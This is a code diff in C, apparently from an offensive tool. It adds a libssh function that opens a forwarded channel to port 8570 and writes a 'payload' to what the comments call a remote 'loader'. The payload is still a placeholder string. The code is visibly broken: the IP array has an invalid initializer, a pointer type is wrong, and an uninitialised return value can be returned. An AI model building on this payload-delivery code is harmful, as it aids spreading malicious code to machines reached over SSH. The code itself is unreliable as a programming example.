@@ -260,13 +260,51 @@ int connect(char *ip)
 	    exit(-1);
 	  }
 	  printf("\nconnected\n");
-	  //ToDo PRIORITY 1 - send payload
-	  //https://api.libssh.org/stable/libssh_tutor_forwarding.html
+
+      char ip_remote[20] = 0;//set this to be the ip of the loader may be able to use char array of local host instead of IP
+	  direct_forwarding(my_ssh_session, ip_remote);
+      
+      
 	  scp_write(my_ssh_session);
 
 	  ssh_disconnect(my_ssh_session);
 	  ssh_free(my_ssh_session);
 	  return(1);
+}
+
+int direct_forwarding(ssh_session session, char ip_remote[20])//fix port number for redirects and the importation of IP addresses
+{
+	ssh_channel forwarding_channel;
+	int rc;
+	char *payload = "Please for the love of god work";//Change this to a vector binary with payload
+	int nbytes, nwritten;
+	forwarding_channel = ssh_channel_new(session);
+	if (forwarding_channel == NULL) {
+      return rc;
+  }
+
+  rc = ssh_channel_open_forward(forwarding_channel,
+                                &ip_remote, 8570, //port that the loader is monitoring NEED TO GET IP OF REMOTE MACHINE
+                                "localhost", 8570);//port that the packer is monitoring (May need to change localhost to IP of that system
+  if (rc != SSH_OK)
+  {
+    ssh_channel_free(forwarding_channel);
+    return rc;
+  }
+
+  nbytes = strlen(payload); //For using vectors we will need to change this
+  nwritten = ssh_channel_write(forwarding_channel,
+                           payload,
+                           nbytes);
+  if (nbytes != nwritten)
+  {
+    ssh_channel_free(forwarding_channel);
+    return SSH_ERROR;
+  }
+
+
+  ssh_channel_free(forwarding_channel);
+  return SSH_OK;
 }
 
 int rec(ssh_session session, ssh_scp scp)
@@ -321,3 +359,4 @@ int rec(ssh_session session, ssh_scp scp)
 
   return SSH_OK;
 }
+ 
